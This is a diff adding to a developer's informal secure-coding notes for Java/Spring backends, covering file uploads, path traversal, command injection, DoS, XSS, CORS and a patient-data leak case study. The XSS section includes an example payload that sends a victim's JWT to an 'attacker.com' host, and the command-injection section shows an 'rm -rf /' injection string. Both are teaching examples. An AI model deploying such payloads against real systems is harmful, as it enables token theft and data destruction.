@@ -104,24 +104,92 @@ Secure Coding notes.txt
   = Let's assume the hackers don't know our code base 
   - Because of the S-bomb and library vulnerabilities mania in the US, they decided to rewrite 15-year-old codebase of Java entirely in C++ without using any library or open source. WTFWTFWTFWTFWTFWTFWTFWTFWTFWTF; they reinvented wheel intead of updating their wheel
 
-
 === CVE handling
   - upgrade 👍
     - if libA -> libX.v1
     - libX.v1 (vulnerable) => v2 causes 💥Class/MethodNotFoundError in libA ar runtime
     - libA 🔼, libB->libA🔼 ... SpringBoot version++
     => testing again, boss🙁
-    => Victor vulnerabilities are the best thing that happened to software crafters because now we have time to refactor everything when we upgrade Spring Boot. we'll test everything, anyway! 
+    => Victor vulnerabilities are the best thing that happened to software crafters because now we have time to refactor everything when we upgrade Spring Boot. we'll test everything, anyway!
   - switch to another !worse library🤞
-  - fix (DIY): 
+  - fix (DIY):
     > fork and fix
     > contribute a fix to OSS!
     > shadowing classes: reimplementing the same class in your src/main to replace the vulnerable🤢🤮
   - downgrade lib
   - ignore🤞
 
-=== user files
+=== file deserialization
   - XXE doctype /passwd
   - XML bomb expanding to 3 GB RAM OOM
   - YAML bomb
   - java de/serialization: save/load state a java instance as byte[] to eg a file/RMI in a Java-specific format
+
+=== FILE VALIDATION
+  - Check magic bytes (Tika), not just the file extension or Content-Type header
+  - Whitelist allowed extensions — whitelisting is always stronger than a denylist
+  - Run an antivirus scan on uploaded content before processing
+
+=== PATH TRAVERSAL
+  - Never write to disk using the user-supplied filename — it can escape the target directory (e.g. ../root/.bashrc)
+  - Whitelist filename chars with a strict regex; blocking only ".." and "/" is weaker
+  - Best fix: generate a random filename on disk (upload-<UUID>.dat), store the original name in the DB
+
+=== SHELL / COMMAND INJECTION
+  - Never concatenate user input into Runtime.exec() — attackers inject extra commands (e.g. a & rm -rf /)
+  - The random-filename fix above also eliminates this surface
+
+=== DENIAL OF SERVICE
+  - Memory: limit upload size (Tomcat default 2 MB) to prevent 500 concurrent x 2 MB = 1 GB OOM
+  - Thread starvation: long processing on HTTP threads exhausts Tomcat's pool (200 threads)
+    => liveness probes time out => Kubernetes kills the pod => fix with async offloading
+  - Unbounded queue: ForkJoinPool.commonPool() has no queue limit
+    => write to a temp file first, queue only a lightweight reference (e.g. a file path)
+  - Disk exhaustion: clean up temp files after processing and enforce a max-age (e.g. 7 days)
+
+=== RESILIENCE
+  - In-memory async work is lost on crash or redeploy / rolling restart
+  - Prefer durable async: publish to Rabbit/Kafka, or use the Inbox Table Pattern
+    (insert a TASK(status=PENDING) row in DB so work survives restarts)
+
+"auth"=?
+  - authn authentication = who are you
+  - authz authorization = what can you do?
+    a) features
+    b) on data (aka jurisdiction)
+      Although your user has access to approve loans, you can only do that for the loans request submitted to your branch. Even worse, you can't even see the loan contracts of other branches.
+
+=== XXS = X/Cross Site Scripting: via a stupid website/app, hacker runs scripts in the victim's browser
+  - we need 2 users with access to an app: hacker + victim
+  - the hacker injects a malicious script in app (eg: a comment on a blog post) which is saved in DB by the backend
+  - the victim user later views that comment and the script runs in their browser  where is rendered with .innerHTML
+  - Exploits: "what can the hacker's JS code do bad in the bro of the victim(admin)"
+    a) fetch(POST, 'employee/{victimId}/salary/increase' {a lot})
+    b) impersonate victim 👑 againts the hacked app
+    -> send out the victim's session cookie (JSSESSION)
+      ⚠️IMPOSSIBLE by default as that cookie is httpOnly=true ie not accessible from js code
+    -> JWT AccessToken is stored in localStorage/var accessible (YUMMY)
+    <img src="x" onerror="fetch('http://attacker.com/steal?cookie='+jwt +' usable for '+document.domain)"> for until jwt.exp = 5m..1h
+    ! the JWT might be usable to more apps than the victim app
+  - fixes:
+    a) use Rich Text editor sending markdown❤️ (∄scripts) **bold** _italic_
+    b) allow-list html tags using org.owasp.html.Sanitizers
+      > done in BE whenever you receive/return HTML to FE
+      > ⭐️ via an annotation on Dto + @Aspect
+      > Paranoia: HttpFilter in Servlet that would automatically sanitize (allow list) any string in any JSON payload in a request or a response => one of those json fields contained encoded data that happened to contain "<"
+
+=== CORS = Cross Origin Resource Sharing
+  - Browsers will check with backend you want to call if they accept JS calls done by .js files loaded from a different domain
+
+
+=== Patient Data Leak Vulnerability case study
+  ❌ URL-scanning attack for sequential IDs
+  - if a hacker sees a numeric id 1002 => they will ask for 1001, for>>
+  - ORACLE reigns
+  => use UUID v4/7 especially towards any WWW user / or an Intranet of 100.000 employees
+  ❌ POST/PUT's body should NOT mirror data back to client. Design mistake; POST creates, not returns = CQRS style
+  => dear FE (!not fullstack, jr FE), I don't need to give you back the patient data.  Just send it to me!
+    have reads going only via GET (properly secured)
+
+  - async handling of a create.X
+  Usecase: In an e-shop, someone places an order, but the ID of the order gets generated after a rabbit queue, so you can't give the ID back to the UI. => go for client-generated UUIDs (generate the id before the rabbit)
